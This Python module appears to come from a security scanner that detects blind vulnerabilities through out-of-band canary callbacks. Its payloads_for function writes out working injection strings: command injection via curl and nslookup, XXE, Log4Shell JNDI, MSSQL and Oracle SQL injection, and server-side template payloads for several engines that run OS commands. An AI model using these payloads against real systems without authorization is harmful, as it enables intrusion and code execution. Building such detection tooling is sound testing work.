"""Canary tokens + out-of-band payload templating.

A *canary* is a unique token embedded in a payload. When the target's backend
processes the payload (fetches a URL, resolves a name, expands an XML entity,
runs a command), it reaches our listener carrying the token — proving a blind
vulnerability that no in-band response could.

Token extraction convention (shared with the listeners): the token is always the
LEFTMOST DNS label of the canary host (``<token>.<base_domain>``) and the FIRST
path segment of the canary URL (``/<token>``).
"""
from __future__ import annotations

import re
import secrets
from dataclasses import dataclass
from typing import Dict
from urllib.parse import urlsplit

# Token shape: lowercase hex, 8-64 chars. The UPPER bound matters — it caps how
# much of a (possibly hostile, oversized) Host header / qname we ever treat as a
# token. secrets.token_hex(8) is 16 chars, well inside this.
_TOKEN_RE = re.compile(r"^[a-f0-9]{8,64}$")


def new_token() -> str:
    """A unique, URL/DNS-safe canary token (lowercase hex)."""
    return secrets.token_hex(8)


def is_canary_token(s) -> bool:
    """True iff `s` has the canary token shape (cheap pre-check before lookup)."""
    return bool(s) and bool(_TOKEN_RE.match(str(s)))


@dataclass
class Canary:
    token: str
    base_domain: str
    base_http: str                 # e.g. "http://oob.example:8080"
    vuln_type: str = ""

    @property
    def domain(self) -> str:
        return f"{self.token}.{self.base_domain}"

    @property
    def http_url(self) -> str:
        return f"{self.base_http.rstrip('/')}/{self.token}"

    @property
    def host_url(self) -> str:
        """URL whose HOST carries the token (for SSRF where only host resolves)."""
        scheme = urlsplit(self.base_http).scheme or "http"
        port = urlsplit(self.base_http).port
        host = self.domain + (f":{port}" if port else "")
        return f"{scheme}://{host}/"

    def to_dict(self) -> dict:
        return {"token": self.token, "domain": self.domain,
                "http_url": self.http_url, "vuln_type": self.vuln_type}


class CanaryFactory:
    def __init__(self, base_domain: str = "oob.local",
                 base_http: str = "http://oob.local"):
        self.base_domain = base_domain
        self.base_http = base_http

    def new(self, vuln_type: str = "") -> Canary:
        return Canary(new_token(), self.base_domain, self.base_http, vuln_type)


def token_from_host(host: str, base_domain: str = "") -> str:
    """Extract the canary token from a Host header / DNS qname (leftmost label)."""
    if not host:
        return ""
    name = host.split(":")[0].strip(".").lower()
    label = name.split(".")[0] if name else ""
    return label if _TOKEN_RE.match(label) else ""


def token_from_path(path: str) -> str:
    """Extract the canary token from a URL path (first segment)."""
    seg = (path or "").lstrip("/").split("/")[0].split("?")[0].lower()
    return seg if _TOKEN_RE.match(seg) else ""


def payloads_for(canary: Canary) -> Dict[str, str]:
    """Concrete OOB payloads for a canary, keyed by attack technique.

    Each, when processed by a vulnerable backend, causes an interaction carrying
    the canary token. Read-only / non-destructive (a fetch or name lookup).
    """
    d = canary.domain
    url = canary.host_url
    purl = canary.http_url
    return {
        # blind SSRF — server-side fetch of an attacker URL
        "ssrf": url,
        "ssrf_path": purl,
        # blind OS command injection — shell reaches out
        "cmdi_curl": f";curl {url}",
        "cmdi_nslookup": f"|nslookup {d}",
        "cmdi_backtick": f"`curl {url}`",
        # blind XXE — external entity resolution
        "xxe": (f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM '
                f'"{url}">]><r>&x;</r>'),
        # JNDI / Log4Shell
        "jndi_ldap": f"${{jndi:ldap://{d}/x}}",
        "jndi_dns": f"${{jndi:dns://{d}/x}}",
        # OAST SQLi (DNS exfil — engine specific; MSSQL/Oracle/MySQL variants)
        "sqli_mssql": f"';exec master..xp_dirtree '//{d}/x';--",
        "sqli_oracle": (f"' || (SELECT UTL_INADDR.GET_HOST_ADDRESS('{d}') "
                        f"FROM dual)||'"),
        # blind SSTI — engine-specific template payloads that make the backend fetch
        # our canary (read-only `curl` to OUR listener; same shape/risk as blind cmdi).
        # Confirmation is the callback; no target data is touched.
        "ssti_jinja": "{{cycler.__init__.__globals__.os.popen('curl " + url + "').read()}}",
        "ssti_twig": "{{['curl " + url + "']|filter('system')}}",
        "ssti_freemarker": ('<#assign ex="freemarker.template.utility.Execute"?new()>'
                            '${ex("curl ' + url + '")}'),
        "ssti_smarty": "{system('curl " + url + "')}",
        "ssti_erb": "<%= system('curl " + url + "') %>",
        "ssti_ssrf": url,   # retained for back-compat
        # generic header/host-injection callback
        "redirect": url,
    }
